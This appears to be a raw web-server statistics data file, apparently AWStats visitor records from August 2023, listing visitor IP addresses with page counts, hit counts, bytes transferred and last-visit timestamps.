+34.216.146.241 1 1 300 20230813133639
+87.76.244.157 0 2 16788 
+217.12.203.185 8 8 1956477 20230830062308
+35.165.30.141 0 1 6783 
+217.174.244.159 1 1 477 20230822014544
+27.69.185.232 1 1 620 20230813023947
+43.230.203.45 2 2 7229 20230823070211
+23.230.21.31 1 1 3625 20230819123852
+115.75.106.220 1 1 620 20230819003809
+125.253.117.112 1 1 477 20230824140802
+185.65.244.147 6 6 1470462 20230829002049
+199.244.88.229 1 1 55398 20230817224202
+176.36.93.150 1 1 55843 20230806232131
+123.207.45.74 3 3 7678 20230817224517
+161.35.39.101 1 1 32707 20230809120032
+34.217.66.171 1 1 55357 20230810130528
+149.56.160.242 1 1 243063 20230820031912
+91.123.148.163 17 175 7307367 20230815034003
+89.38.132.218 1 1 55443 20230818042012
+217.66.158.77 0 1 28483 
+81.19.139.41 7 7 1713402 20230829152057
+93.72.186.145 28 143 5233737 20230801180934
+88.83.200.170 2 42 870928 20230801112234
+146.148.66.135 2 2 1240 20230825140444
+45.55.64.182 1 1 33241 20230805182438
+194.87.216.74 5 5 1221211 20230828092040
+222.124.215.227 1 1 620 20230813023942
+187.216.223.230 1 1 620 20230813024101
+105.156.54.28 1 1 477 20230808030127
+178.155.5.252 2 43 877653 20230803142307
+196.206.228.232 1 1 477 20230808030437
+178.63.206.60 9 9 23034 20230817233451
+23.178.112.201 1 1 300 20230813133639
+38.15.158.127 1 1 32849 20230818164942
+72.14.201.49 8 8 374563 20230828164444
+46.211.105.66 2 3 28828 20230807161801
+46.211.86.123 4 106 4760717 20230801132559
+195.54.170.231 5 5 1221277 20230828132039
+213.160.156.99 12 59 1161423 20230810152836
+93.73.210.163 2 50 1225661 20230814073735
+82.115.19.133 2 2 110710 20230828070157
+91.149.253.229 6 6 1470472 20230828212048
+103.193.72.4 12 12 30712 20230818053654
+34.217.11.65 1 1 55863 20230804125715
+165.22.216.105 6 6 15356 20230818074752
+45.8.223.239 1 1 55377 20230813133802
+109.106.254.12 1 1 3661 20230823221933
+198.244.167.101 1 1 3706 20230809025908
+216.250.127.249 1 1 477 20230822093453
+208.77.216.41 3 3 7678 20230818021259
+23.94.200.184 1 1 477 20230820232403
+52.5.144.178 1 1 493 20230831054108
+64.207.176.126 1 1 3648 20230807193810
+37.139.52.142 8 8 1962758 20230829122057
+14.191.24.67 1 1 125911 20230818054407
+210.207.92.24 1 1 3662 20230815174212
+162.0.209.16 2 2 7204 20230807071614
+185.182.185.187 12 12 30712 20230818081520
+87.236.176.238 1 1 55905 20230807143436
+77.111.244.22 4 35 298989 20230807220918
+143.244.160.172 15 15 38390 20230818033613
+77.68.24.86 6 6 15356 20230817204509
+185.38.16.124 1 1 31834 20230821110251
+35.87.17.17 1 1 55886 20230805130612
+77.111.244.47 5 57 743544 20230811213117
+89.64.63.0 8 55 888143 20230808223046
+34.220.111.99 1 1 55896 20230801123424
+194.4.68.204 6 35 616597 20230812152349
+178.92.253.203 7 107 2780665 20230801142126
+198.57.158.107 7 7 272548 20230812080107
+181.215.78.158 6 6 15356 20230818052301
+104.248.58.61 1 1 55377 20230831031428
+185.65.244.192 9 9 2205642 20230830172553
+35.187.58.136 1 1 3648 20230807234657
+20.125.146.151 2 2 56724 20230806120713
+95.153.178.39 0 1 41155 
+72.14.201.23 1 1 55905 20230809161322
+95.132.75.132 2 32 972473 20230820123053
+164.68.125.108 1 1 47805 20230808163249
+95.216.36.254 33 33 84458 20230818054648
+188.68.237.138 6 6 1464251 20230831222604
+36.90.208.73 1 1 620 20230813024026
+74.125.208.35 1 1 55355 20230828120424
+172.232.56.87 1 1 55378 20230830040839
+80.150.6.150 1 1 3649 20230808084920
+89.175.184.250 8 37 529791 20230819200118
+46.211.174.21 7 56 788251 20230811190855
+142.93.12.220 2 2 110738 20230829193706
+91.214.139.93 2 50 637953 20230814093307
+49.232.145.205 2 2 7367 20230816172303
+185.44.82.16 1 1 243015 20230830122320
+159.65.137.20 1 1 477 20230819020307
+103.102.234.23 1 1 620 20230825152303
+38.180.22.172 7 7 1713344 20230831032555
+77.111.244.4 2 33 238114 20230809092356
+183.136.225.46 3 5 180168 20230816062942
+137.184.124.136 3 3 11019 20230831193927
+72.14.201.207 1 1 34168 20230803151926
+85.238.103.50 10 59 867947 20230819013807
+167.71.198.255 6 6 15356 20230818061752
+176.53.217.29 1 2 62143 20230816133538
+93.171.246.145 3 77 2598167 20230827214553
+185.38.18.145 1 1 33221 20230808103252
+185.243.214.220 6 6 1470325 20230826211807
+189.131.242.240 1 1 477 20230808030356
+15.235.181.184 6 6 15356 20230818033818
+128.90.44.14 1 1 226 20230812122608
+167.249.21.13 1 1 620 20230813024038
+217.25.198.81 3 62 1016713 20230824212430
+159.69.25.127 3 3 1479 20230831120214
+137.184.88.156 9 9 23034 20230818022830
+91.200.11.170 20 85 3434560 20230823000708
+188.132.135.3 2 2 986 20230831164851
+148.72.214.194 1 1 3648 20230807224244
+54.245.152.23 1 1 55391 20230814131910
+161.129.164.103 2 2 0 20230819042420
+34.143.221.113 6 6 15356 20230817172813
+146.120.100.18 4 58 1558970 20230825225321
+154.180.136.41 1 1 477 20230808030637
+185.243.215.104 7 7 1719543 20230825191741
+173.249.55.218 1 1 493 20230831130123
+47.111.116.44 2 2 7309 20230824011033
+212.193.2.7 7 7 1719554 20230825151739
+95.85.103.175 14 62 1041666 20230802102657
+151.80.60.202 1 1 203596 20230815154007
+178.133.200.123 4 38 624689 20230811070305
+27.79.203.231 1 1 620 20230819003828
+20.204.41.62 1 1 3662 20230816094245
+46.211.123.220 2 47 568951 20230802140604
+162.142.125.217 1 4 76202 20230809192844
+208.87.133.19 3 3 59744 20230812013843
+176.36.212.190 5 53 1247946 20230803213441
+194.44.50.121 3 40 530791 20230829143111
+216.158.226.225 1 1 493 20230831133302
+178.133.25.151 5 41 767832 20230808231440
+178.128.39.152 1 1 55368 20230819055619
+88.99.105.78 1 1 477 20230823052315
+194.163.155.198 3 3 7678 20230817202347
+34.209.188.187 1 1 55391 20230814131804
+168.151.134.43 1 1 55368 20230819042902
+193.0.219.137 15 100 1474315 20230829175338
+58.71.214.37 12 12 24894 20230831123137
+181.209.82.83 1 1 477 20230808032301
+35.247.137.39 12 12 30712 20230818024520
+202.138.242.121 1 1 3614 20230801040225
+103.48.193.205 4 4 8298 20230825130324
+117.7.234.27 2 2 1240 20230813023756
+202.92.7.54 6 6 15356 20230817192400
+185.132.36.144 9 9 215351 20230827012704
+93.119.227.19 2 2 486008 20230816231325
+88.155.154.250 3 36 576865 20230827123115
+213.159.241.55 17 71 1290483 20230802084749
+201.15.37.41 1 1 620 20230813024042
+189.6.122.15 2 2 1097 20230819003837
+46.211.97.103 2 38 895444 20230829065750
+158.69.55.111 6 6 15356 20230818075534
+176.224.21.16 1 1 620 20230813023735
+167.94.138.125 1 5 82489 20230825093153
+141.98.11.206 1 1 244 20230824034346
+3.143.208.10 6 53 669908 20230809025745
+46.211.174.218 2 37 427185 20230819080114
+91.149.255.68 7 7 1719641 20230828192047
+152.228.216.193 1 1 477 20230821224111
+134.122.11.37 3 3 7678 20230817232152
+157.245.40.165 19 19 29234 20230830173642
+45.90.63.123 1 2 62174 20230814213120
+194.163.182.127 3 3 7678 20230817201134
+128.124.220.95 2 30 599432 20230814163137
+5.90.70.94 3 37 411775 20230807125222
+115.245.68.134 6 6 15356 20230817191121
+45.120.69.121 3 3 10973 20230816050840
+54.218.125.235 1 1 55896 20230801123511
+46.29.18.110 5 5 1221188 20230825121739
+104.244.73.193 1 1 125911 20230819153246
+102.156.242.143 1 1 620 20230813023708
+185.38.218.84 1 1 160831 20230809103550
+91.149.232.57 6 6 1464515 20230828002032
+103.163.217.19 12 12 30712 20230818031916
+104.248.12.53 1 1 55384 20230827051823
+206.189.54.26 3 3 11029 20230824122947
+88.198.48.98 2 2 110738 20230829193706
+123.184.26.16 3 3 166087 20230831053937
+185.90.61.135 4 4 978245 20230824161533
+180.190.5.60 1 1 620 20230813023854
+52.35.247.61 0 1 6783 
+176.59.215.78 0 1 73089 
+136.232.98.254 1 1 620 20230813024003
+178.204.96.77 0 1 25813 
+193.32.71.137 3 33 758699 20230831104406
+84.39.225.186 1 1 55359 20230815042307
+137.184.197.15 9 9 23034 20230818053815
+173.236.152.123 1 1 3661 20230814053819
+82.221.129.44 2 2 7229 20230823085150
+70.39.250.195 1 1 477 20230822214413
+35.209.84.205 4 4 14665 20230815191917
+128.90.135.102 1 1 226 20230830152028
+54.200.48.215 1 1 55448 20230825125457
+3.145.48.112 6 53 670421 20230801212058
+72.14.201.48 4 4 199994 20230821213148
+190.73.204.97 1 1 620 20230819003800
+193.186.4.49 8 8 417514 20230813123149
+178.128.157.132 3 3 7678 20230817202505
+176.38.155.40 8 68 1022207 20230829155542
+170.79.202.255 1 1 477 20230808030628
+46.182.85.170 30 88 1405990 20230801130727
+46.219.214.96 4 56 1062470 20230807205500
+14.233.179.202 1 1 125910 20230814194812
+52.89.165.157 1 2 62139 20230825125533
+185.231.233.233 7 7 1713374 20230831202606
+27.71.120.131 1 1 620 20230817133157
+106.51.96.11 1 1 620 20230813023653
+109.104.154.12 6 6 1464341 20230825131739
+195.114.149.122 2 29 384454 20230813215529
+51.254.199.11 4 4 222106 20230827073222
+43.128.120.27 9 9 23034 20230818042108
+93.82.7.6 0 1 85332 
+113.160.207.172 1 1 477 20230808030200
+37.73.6.89 22 391 7102161 20230810114000
+113.160.171.171 1 1 161322 20230816154830
+195.24.93.197 6 6 15356 20230818074901
+45.227.255.79 1 1 243009 20230831001529
+85.239.233.198 1 1 3661 20230809093855
+176.36.11.24 3 52 1249402 20230810171545
+178.158.254.93 8 96 1438684 20230825160848
+35.195.93.43 2 2 111810 20230806180214
+82.221.136.1 1 1 493 20230822071634
+178.133.193.0 6 66 1115149 20230810112419
+213.237.88.238 32 69 4485187 20230829022325
+80.87.208.137 3 3 11048 20230809051519
+161.18.83.109 1 1 620 20230813023835
+178.133.37.118 7 57 1395159 20230804085558
+51.15.17.105 1 1 47355 20230813024258
+146.190.133.143 1 1 28112 20230805080200
+192.71.103.173 1 1 55853 20230808235951
+45.133.172.89 1 3 426736 20230813133955
+93.73.174.36 2 40 1352807 20230805205540
+46.211.89.161 7 56 1121842 20230821205458
+13.75.189.243 1 1 3661 20230823234305
+91.148.135.226 6 6 1464242 20230828102039
+119.92.51.165 1 1 477 20230808030628
+176.36.183.207 4 49 681284 20230809100156
+78.173.133.13 1 1 477 20230808030523
+45.76.188.234 3 3 7678 20230817135517
+136.232.169.246 1 1 493 20230807155433
+174.129.86.71 2 51 492373 20230820202543
+82.223.22.112 1 1 477 20230821053251
+178.212.111.84 2 34 859616 20230830215946
+185.65.244.220 6 6 1470399 20230827061811
+92.204.144.187 6 6 15356 20230818002334
+83.149.28.21 0 2 212379 
+203.161.32.206 1 1 620 20230825095628
+103.121.198.170 1 1 125919 20230820214553
+188.165.150.156 4 4 984354 20230818040732
+172.177.46.250 1 1 249207 20230803005220
+89.209.96.115 0 1 28483 
+106.51.114.44 1 1 620 20230819003725
+66.94.110.229 1 1 477 20230822034835
+88.155.114.131 5 77 7332408 20230829145153
+178.155.5.107 1 1 274156 20230829050142
+115.186.174.115 1 1 620 20230819003831
+18.224.1.60 1 1 300 20230813133631
+51.68.38.140 1 1 3662 20230824032301
+176.202.94.157 1 1 620 20230819003817
+62.122.184.194 8 8 1477983 20230829125257
+46.211.254.11 3 52 843476 20230811133331
+5.161.211.41 1 1 55360 20230816220820
+188.163.72.222 3 69 679531 20230828120352
+104.244.122.63 3 3 60259 20230808170450
+203.129.30.213 1 1 3661 20230809112430
+5.135.4.74 6 6 1470329 20230825091738
+45.33.26.110 2 2 56675 20230809015312
+139.59.81.220 1 1 477 20230824082549
+89.104.100.219 0 2 13566 
+185.65.244.224 5 5 1221284 20230826061742
+149.50.212.8 1 1 249207 20230803054900
+88.155.119.87 1 1 55370 20230828164156
+185.244.148.91 1 1 243026 20230810083911
+46.211.15.146 0 1 329738 
+176.53.221.38 1 2 62142 20230815075113
+192.71.144.12 1 1 3693 20230809015232
+180.183.165.149 1 1 620 20230813023959
+37.252.10.127 6 6 1470328 20230827232031
+185.11.167.131 4 4 1908 20230823095635
+34.221.43.156 1 1 55355 20230828130010
+105.72.242.245 1 1 620 20230813023819
+185.143.223.76 6 6 1470356 20230826221808
+18.237.95.59 1 2 62669 20230805130459
+46.164.159.94 0 1 53549 
+66.102.9.135 1 1 33003 20230807113539
+206.62.16.81 1 1 161316 20230821181119
+193.242.162.254 9 91 2714512 20230816001138
+165.22.50.209 2 2 7229 20230823115347
+88.208.249.102 11 11 307764 20230819101536
+137.184.60.117 1 1 477 20230819142951
+173.236.152.106 18 18 46068 20230818050442
+51.83.242.99 7 7 1713477 20230829182306
+149.51.214.40 12 12 30712 20230818063925
+35.166.241.52 0 1 6783 
+41.38.195.92 1 1 477 20230808030253
+178.95.146.93 0 1 25813 
+5.154.181.47 8 8 1962578 20230829202308
+77.254.229.86 0 1 25813 
+80.252.243.26 4 41 1463516 20230815171039
+46.219.208.96 6 53 1009977 20230827093704
+181.58.38.41 1 1 620 20230819003712
+185.181.60.189 1 1 55360 20230816062052
+77.111.244.23 1 1 30289 20230806144655
+103.152.164.138 2 2 7187 20230822143422
+170.64.176.23 6 6 15356 20230817195618
+178.94.34.90 5 61 687511 20230805145513
+34.220.56.180 1 1 55882 20230803124503
+176.36.36.4 7 49 1061476 20230815082552
+46.211.81.108 1 1 33214 20230811080124
+37.73.165.68 2 34 400523 20230812191523
+202.164.212.65 1 1 477 20230808031024
+203.124.41.171 1 1 493 20230822202240
+69.43.139.165 1 1 3693 20230808205909
+89.104.111.252 1 3 68957 20230814045430
+94.130.67.88 6 6 15356 20230818070959
+35.93.139.250 1 2 62646 20230803181542
+83.4.219.120 1 1 620 20230813024106
+164.90.205.13 1 1 55413 20230829031822
+146.70.201.10 1 1 55377 20230813133809
+92.53.96.135 1 1 477 20230822055026
+54.201.169.182 1 1 55357 20230810130346
+46.211.166.4 2 30 314420 20230815235020
+78.27.164.79 19 169 2492716 20230817110243
+77.252.47.192 0 2 170664 
+139.144.150.8 1 1 243013 20230813133858
+46.211.161.123 9 59 1422800 20230806103804
+36.81.104.120 1 1 620 20230813024053
+172.81.119.79 9 9 23034 20230817185029
+185.154.52.86 1 1 477 20230820020919
+46.183.121.47 1 1 620 20230819003727
+75.119.143.43 3 3 7678 20230818062809
+23.94.77.146 3 3 1431 20230822122316
+27.34.72.49 3 3 7722 20230823123807
+45.136.199.251 6 6 1470336 20230826181805
+208.113.188.102 4 4 8215 20230823142942
+50.60.190.230 1 1 620 20230813023940
+171.244.8.191 9 9 23034 20230818011513
+46.211.78.69 3 36 607959 20230828084803
+82.196.25.121 3 3 7678 20230817161007
+195.211.77.140 3 3 729039 20230813133817
+195.38.8.64 2 2 549065 20230825202352
+34.222.65.48 1 1 243030 20230828172229
+51.210.183.85 3 3 7678 20230818000953
+205.237.94.134 1 1 55398 20230817042429
+185.2.5.77 1 1 3662 20230816085649
+162.55.103.246 7 7 272667 20230811150434
+87.236.176.173 0 1 6770 
+195.49.149.82 13 57 1183768 20230801144815
+34.69.109.132 1 1 3649 20230808230608
+118.218.219.212 6 6 15356 20230818020203
+162.254.205.82 1 1 493 20230831090543
+175.178.47.143 2 2 1240 20230831123115
+178.133.56.164 2 30 245284 20230801220753
+40.78.152.130 1 1 244 20230803142716
+13.212.206.146 3 3 7678 20230818035834
+203.154.91.13 1 1 3735 20230812055723
+176.105.0.231 2 49 661373 20230803194136
+176.31.241.6 3 3 7678 20230818010604
+185.247.184.11 6 6 1470391 20230828022034
+217.20.185.196 2 29 300031 20230811194004
+164.90.170.31 1 1 3649 20230808092042
+182.70.240.95 1 1 620 20230813024104
+178.133.81.53 2 19 581113 20230804085029
+31.172.83.156 9 9 23034 20230818064812
+141.95.81.34 6 6 1464202 20230830212554
+178.133.57.202 6 59 971926 20230809193005
+192.71.126.151 1 1 55896 20230802053936
+113.184.112.113 1 1 620 20230813024006
+165.22.217.243 1 1 55377 20230813044337
+194.233.82.176 6 6 25276 20230822121838
+94.244.16.217 5 62 1339352 20230811120421
+36.68.23.120 1 1 620 20230813023659
+51.77.230.29 1 1 3648 20230808025841
+45.148.121.89 12 12 30712 20230818044711
+46.101.12.145 1 1 477 20230821214053
+95.134.106.236 6 61 763197 20230818132218
+178.32.114.31 5 5 18268 20230823213911
+54.157.99.190 1 1 55888 20230808010849
+35.87.188.225 1 2 62646 20230804125854
+181.110.74.123 1 1 477 20230808030630
+74.125.208.34 1 1 55355 20230828120424
+118.163.84.102 1 1 209549 20230804195213
+46.240.140.238 1 1 620 20230819003738
+213.175.66.138 3 3 10960 20230816003304
+43.225.108.187 1 1 3661 20230809101406
+185.246.131.254 5 5 1221318 20230825181739
+178.133.88.23 3 76 2219934 20230804191950
+159.223.222.161 1 1 3661 20230814010548
+82.156.141.141 5 5 3100 20230831032254
+212.200.43.4 1 1 620 20230813023712
+193.186.4.21 1 1 55413 20230828165733
+66.249.93.131 3 45 1179379 20230828120428
+46.211.20.59 7 48 605614 20230830085028
+139.99.134.103 2 2 102735 20230826204034
+178.120.48.189 1 9 136129 20230826221500
+69.60.122.22 1 1 493 20230831103521
+37.210.156.73 1 1 620 20230813023754
+46.211.151.249 2 30 365424 20230831173342
+196.22.142.215 3 3 59747 20230821213732
+192.64.5.222 1 1 226 20230813150716
+194.58.34.114 7 7 1719508 20230826121806
+62.210.127.245 3 3 7678 20230817175211
+91.123.150.155 2 34 400481 20230822095349
+35.89.179.183 1 1 55352 20230822130742
+193.186.4.48 4 4 175581 20230829155812
+178.214.195.90 22 88 2018804 20230829135649
+46.96.172.173 2 30 599529 20230813153520
+78.25.5.155 4 68 1095228 20230824175616
+35.160.69.209 1 1 55863 20230804125651
+89.116.236.84 6 6 15356 20230818022513
+46.235.40.87 1 1 477 20230823032642
+193.186.4.51 6 6 259908 20230822003935
+151.82.251.126 19 79 2185433 20230810161732
+208.97.186.104 3 3 11002 20230814180516
+194.44.191.69 4 58 889511 20230823111051
+193.105.234.24 6 6 15356 20230818055953
+51.254.72.132 1 1 477 20230821193846
+93.72.178.240 7 57 1387259 20230826182450
+93.74.91.37 1 32 330532 20230821111422
+212.90.62.8 8 65 1424852 20230822161029
+147.182.199.7 3 3 7678 20230818055149
+83.229.13.63 1 1 0 20230819041946
+139.196.46.20 2 2 7323 20230824045333
+193.110.77.43 8 55 978440 20230813092713
+87.236.176.32 1 1 55360 20230816212451
+185.18.197.110 2 2 7311 20230824040808
+13.79.17.158 3 3 11005 20230824002637
+181.174.125.214 4 4 14632 20230823230017
+199.244.88.220 1 1 55853 20230809012545
+157.90.75.51 12 12 30712 20230818033919
+52.12.224.81 1 1 55356 20230825125527
+97.107.132.238 2 2 954 20230823090023
+173.236.184.135 1 1 3662 20230816042151
+189.189.129.73 1 1 620 20230813023711
+159.223.71.71 2 2 110714 20230825043051
+18.237.55.17 1 1 55391 20230814131733
+193.200.84.45 8 64 901078 20230805171241
+37.110.4.91 2 41 870017 20230822060121
+137.184.162.200 9 9 23034 20230817184750
+20.224.212.230 1 1 3693 20230808195607
+195.77.53.1 1 1 477 20230808030221
+93.73.200.104 4 46 678430 20230818184246
+117.185.229.12 3 3 166087 20230831053921
+87.236.176.25 0 1 6770 
+167.99.135.149 1 1 55905 20230809181648
+45.129.96.27 5 5 1221275 20230829072055
+46.211.121.213 13 119 6183165 20230815110818
+147.182.153.122 1 1 55369 20230825031949
+87.236.176.223 0 1 6770 
+35.88.183.114 0 1 6783 
+82.223.30.152 3 3 7678 20230818012508
+94.76.83.194 9 65 933325 20230808232929
+165.225.207.49 10 72 2422012 20230829211852
+161.35.67.85 1 1 55355 20230827162951
+192.36.198.80 1 1 55360 20230816163042
+51.89.1.215 6 6 1470439 20230828152038
+88.155.180.2 2 72 787252 20230802095027
+95.164.72.218 0 1 1021 
+1.10.141.214 1 1 620 20230813023843
+46.211.97.212 14 61 1082393 20230825092414
+106.15.38.206 1 1 3649 20230809011926
+194.163.137.67 15 15 38390 20230818073630
+212.58.103.32 1 1 477 20230808031642
+91.219.30.15 6 6 1470461 20230826161806
+125.166.2.54 1 1 620 20230817133204
+194.42.112.183 4 52 439297 20230810192709
+115.245.68.131 2 2 7185 20230823034501
+91.226.253.77 7 64 1406666 20230810211949
+129.154.226.3 9 9 23034 20230818014350
+178.133.60.222 15 75 1906849 20230831112520
+185.186.78.229 8 8 1962553 20230831132558
+95.169.181.88 5 5 1221244 20230827142023
+176.36.161.220 14 64 1097577 20230829103621
+185.213.9.10 9 9 23034 20230818070320
+77.111.244.8 1 1 37316 20230812162854
+178.18.246.182 3 3 7678 20230817150949
+103.138.106.21 1 1 620 20230827081201
+103.211.185.157 1 1 55360 20230816042135
+176.193.14.27 1 1 243051 20230816100331
+103.110.111.5 2 47 653994 20230810004331
+91.193.166.101 2 44 406586 20230814115918
+84.115.217.225 5 56 1840899 20230806004238
+186.22.19.124 1 1 477 20230808030847
+121.121.117.178 1 1 620 20230819003721
+165.232.191.9 2 2 7368 20230816181239
+142.93.105.233 1 1 477 20230818054348
+218.255.7.250 1 1 125934 20230815175929
+81.19.141.59 6 6 1470509 20230831192603
+109.175.104.178 1 1 620 20230819003703
+109.129.127.186 1 2 67646 20230803012656
+77.111.244.38 24 125 2297485 20230828163939
+45.154.98.54 2 2 56177 20230828021435
+191.7.222.180 1 1 620 20230813023813
+43.251.221.215 1 1 620 20230813023956
+202.131.247.149 1 1 620 20230813023829
+204.48.22.179 1 1 55355 20230827162952
+49.49.171.159 1 1 620 20230817133211
+85.128.143.99 1 1 477 20230821064536
+88.198.8.158 9 9 23034 20230817203352
+62.182.223.229 1 1 477 20230824115725
+176.97.6.173 2 35 401499 20230804141103
+185.38.248.67 6 6 1464242 20230828012034
+31.148.221.95 2 31 600579 20230803200227
+37.73.143.48 2 34 419614 20230820114108
+36.69.119.101 1 1 161319 20230819153243
+128.124.141.171 0 1 25813 
+139.59.189.1 12 12 30712 20230818035816
+13.71.49.22 6 6 15356 20230818024856
+5.199.136.71 4 4 63425 20230811075653
+82.165.100.100 1 1 477 20230822155737
+38.242.199.136 6 6 15356 20230817200122
+46.253.140.13 2 41 797124 20230814120220
+173.236.176.129 2 2 7310 20230814091335
+103.76.188.202 1 1 620 20230819003746
+77.111.244.42 3 34 268559 20230808200317
+47.108.197.26 6 6 15356 20230818021912
+72.14.201.51 12 12 527067 20230829155353
+54.245.146.224 3 3 7678 20230818063416
+104.164.173.49 1 1 55377 20230813133800
+35.91.47.8 0 1 6783 
+217.76.12.106 0 1 5941 
+5.161.106.116 2 2 65773 20230806205828
+52.143.183.58 1 1 477 20230824154711
+185.213.22.202 7 7 1713399 20230831232606
+5.173.25.47 2 30 599537 20230825221730
+183.182.120.210 1 1 477 20230808030403
+151.106.126.172 2 2 1240 20230828200508
+46.211.225.61 2 52 1861593 20230814104946
+94.153.192.9 2 7 163151 20230827101350
+192.177.188.138 1 1 32960 20230819123846
+35.212.181.173 12 12 30712 20230817230927
+88.151.195.111 5 5 1227434 20230824231534
+23.178.112.209 1 1 300 20230813133635
+46.211.72.13 18 63 1183990 20230814100023
+183.80.232.124 3 3 7678 20230817183446
+45.80.158.152 4 4 167974 20230816152714
+18.246.129.211 6 6 15356 20230818060300
+61.2.102.26 9 9 23034 20230818032319
+187.193.187.202 1 1 620 20230813023744
+119.93.131.165 1 1 620 20230813024050
+159.69.134.66 7 7 272695 20230811150435
+18.246.70.82 1 1 55863 20230804125640
+176.53.223.97 1 3 68926 20230816130937
+207.244.255.8 9 9 23034 20230818055833
+82.223.5.246 1 1 477 20230821075446
+176.100.25.20 5 64 980283 20230831213445
+45.87.212.78 1 3 426736 20230813133955
+45.95.243.51 2 90 5493857 20230814155622
+91.149.240.232 5 5 1221292 20230825051536
+181.33.216.10 1 1 161310 20230820214549
+58.65.160.155 1 1 477 20230808030221
+46.133.177.28 1 2 46683 20230827144357
+217.21.94.58 1 1 3662 20230815204757
+46.183.9.10 18 18 46068 20230818042847
+179.1.192.20 1 1 161328 20230814194808
+38.180.19.97 5 5 1221200 20230826151806
+194.87.45.84 5 5 1221211 20230825171740
+167.86.71.215 5 5 11888 20230818002819
+62.138.0.171 1 1 477 20230822024552
+179.179.231.222 1 1 620 20230819003736
+54.37.156.240 1 1 3648 20230807210841
+89.44.109.160 9 9 23034 20230818080904
+188.78.194.51 9 9 23034 20230817234032
+37.214.52.84 0 1 9258 
+179.6.170.187 1 1 620 20230819003732
+76.221.186.129 6 6 15356 20230818082037
+162.241.230.132 2 2 7450 20230810053628
+37.73.65.244 2 34 386825 20230807184423
+34.86.122.158 3 3 7678 20230817224245
+195.252.70.154 1 1 477 20230808030155
+185.237.185.224 6 6 1464206 20230825041535
+194.163.146.4 12 12 30712 20230818074941
+68.178.150.226 4 4 14370 20230815112741
+81.28.120.171 1 1 620 20230813023944
+188.163.83.12 1 14 304992 20230813100618
+87.236.176.252 0 1 6770 
+178.214.244.147 2 51 492455 20230820070839
+45.81.39.171 1 1 55456 20230812225140
+46.211.71.19 2 34 386676 20230809193725
+35.163.54.167 1 1 300 20230813133634
+201.221.114.2 1 1 125911 20230820011603
+37.73.72.17 6 42 1175683 20230820073453
+46.29.234.65 7 7 1707271 20230831012556
+77.29.18.43 1 1 493 20230831154201
+35.92.114.102 1 1 55882 20230803124426
+104.28.131.167 2 43 1171619 20230801221538
+185.181.229.131 12 12 2934586 20230830132320
+87.236.176.144 1 1 55363 20230821104832
+178.94.45.190 5 110 1548345 20230806155017
+65.108.212.225 6 6 15356 20230818073034
+182.253.179.146 1 1 620 20230817133141
+125.166.116.118 1 1 620 20230813023738
+77.111.244.49 1 1 30289 20230805174357
+78.153.196.122 2 2 83601 20230805020615
+52.40.200.49 1 1 55357 20230810130512
+89.104.110.37 1 2 62148 20230813230509
+35.88.230.4 1 2 62138 20230828130045
+162.240.98.21 6 6 15356 20230817183112
+46.211.108.101 3 50 1478753 20230814190938
+46.228.199.158 1 1 55886 20230805105641
+88.155.190.225 0 1 60377 
+14.162.159.74 1 1 477 20230808032130
+20.150.210.154 1 1 477 20230824093737
+88.99.253.142 6 6 15356 20230818063742
+52.9.252.82 1 1 477 20230818192801
+5.9.12.92 6 6 15356 20230818030549
+182.253.130.75 1 1 477 20230808030946
+54.186.6.158 1 1 55886 20230805130552
+103.185.239.39 1 1 477 20230808030141
+23.27.240.241 1 1 3625 20230819180351
+45.195.25.76 12 12 30712 20230817231611
+143.198.18.48 3 3 7678 20230818053334
+138.97.162.113 1 1 477 20230808030641
+35.195.32.74 1 1 55352 20230823102624
+46.101.180.149 2 38 506560 20230809045358
+191.101.2.90 9 9 23034 20230818065959
+88.152.184.220 2 77 6380675 20230826160432
+187.94.203.115 1 1 620 20230813023703
+203.112.76.18 2 2 7309 20230813180520
+44.200.22.115 2 4 70305 20230820090020
+178.158.194.14 1 1 55902 20230806001133
+177.126.245.159 2 2 205231 20230825214005
+46.211.119.233 3 84 2692266 20230806200725
+195.234.78.19 7 58 1373228 20230812151545
+18.117.75.84 6 51 666251 20230823070645
+139.59.150.39 1 1 477 20230818085142
+86.104.39.247 9 9 215256 20230828032638
+113.176.82.191 1 1 620 20230813023816
+205.169.39.160 3 68 698738 20230813141028
+178.251.110.181 8 107 4128272 20230816132912
+89.104.101.234 0 2 13566 
+93.115.12.82 1 1 55391 20230814042150
+35.187.155.165 5 5 14863 20230817142101
+89.104.100.17 0 1 6783 
+189.217.40.203 1 1 620 20230813023719
+187.194.137.209 1 1 47336 20230828085814
+176.37.130.140 12 68 1116492 20230821205741
+34.213.212.251 1 1 55886 20230805130437
+46.105.29.21 2 2 7323 20230816102948
+104.28.207.217 2 52 499083 20230830200114
+103.147.92.9 9 9 23034 20230817235917
+51.81.245.138 1 1 55365 20230813133801
+195.238.126.62 7 7 1713499 20230830182553
+213.227.129.69 2 2 1240 20230825152258
+103.176.229.45 1 1 477 20230808030232
+5.161.180.182 1 1 33129 20230805114204
+46.211.87.26 6 46 711600 20230826101408
+65.109.146.33 1 1 243013 20230822170350
+185.141.61.69 6 6 1464386 20230828112038
+201.162.102.134 1 1 620 20230819003813
+171.244.43.14 1 1 55365 20230813193809
+103.159.250.35 1 1 620 20230813024034
+65.154.226.168 2 55 670841 20230813141214
+59.96.58.153 1 1 243032 20230819030151
+38.180.18.28 9 9 2205572 20230831212604
+37.73.72.135 2 30 391059 20230823180624
+95.29.229.252 2 42 870940 20230804171640
+75.119.159.206 1 1 477 20230823204026
+136.243.86.137 3 3 735262 20230818000731
+45.227.174.37 1 1 477 20230808030434
+65.109.96.141 1 1 477 20230823124646
+103.108.140.205 9 9 23034 20230817213716
+49.7.69.41 2 2 110738 20230830054020
+195.78.66.161 5 5 3100 20230827131641
+109.165.94.135 2 41 870017 20230822060126
+77.111.244.31 1 1 30289 20230805230627
+150.95.25.52 3 3 7678 20230818035322
+192.64.6.14 1 1 226 20230805192811
+95.158.43.114 2 34 517539 20230827221415
+130.255.162.199 1 1 477 20230822064833
+89.248.107.67 9 9 23034 20230818035200
+104.156.252.213 1 1 477 20230819102120
+178.128.187.183 1 1 3662 20230824053918
+37.106.179.142 1 1 620 20230813023822
+188.190.244.57 1 1 55363 20230821100814
+40.73.4.118 1 1 3661 20230823183403
+34.22.213.233 1 1 55905 20230806180217
+37.187.135.45 2 2 7311 20230824105302
+177.148.192.14 1 1 477 20230808030351
+185.141.104.251 6 6 15356 20230818042411
+34.214.159.197 1 1 55886 20230805130456
+34.124.162.181 6 6 15356 20230818030245
+181.215.15.177 9 9 2217877 20230826091742
+54.190.45.16 0 1 6783 
+45.157.40.89 1 1 477 20230824064449
+165.227.217.176 1 1 55377 20230823034804
